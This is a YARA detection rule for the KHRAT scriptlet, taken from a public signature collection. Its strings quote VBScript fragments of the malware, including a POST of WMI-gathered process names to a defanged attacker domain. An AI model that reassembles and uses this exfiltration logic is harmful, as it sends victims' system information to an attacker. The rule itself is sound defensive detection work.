import "pe"


import "pe"


rule SIGNATURE_BASE_MAL_KHRAT_Scritplet : FILE
{
	meta:
		description = "Rule derived from KHRAT scriptlet"
		author = "Florian Roth (Nextron Systems)"
		id = "f72d68a3-0409-5401-b6a1-ca8f188d7409"
		date = "2017-08-31"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_khrat.yar#L43-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
		logic_hash = "cbbabd8e2f17827d96aeef4ea362f133cf3fcc31716c517b86a05a010ff62510"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "cdb9104636a6f7c6018fe99bc18fb8b542689a84c23c10e9ea13d5aa275fd40e"

	strings:
		$x1 = "http.open \"POST\", \"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\",False,\"\",\"\" " fullword ascii
		$x2 = "Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description" fullword ascii
		$s1 = "http.SetRequestHeader \"Content-Type\", \"application/json\" " fullword ascii
		$s2 = "Dim http,WMI,Objs,Process" fullword ascii
		$s3 = "Set Objs=WMI.InstancesOf(\"Win32_Process\")" fullword ascii
		$s4 = "'WScript.Echo http.responseText " fullword ascii

	condition:
		uint16(0)==0x3f3c and filesize <1KB and (1 of ($x*) or 4 of them )
}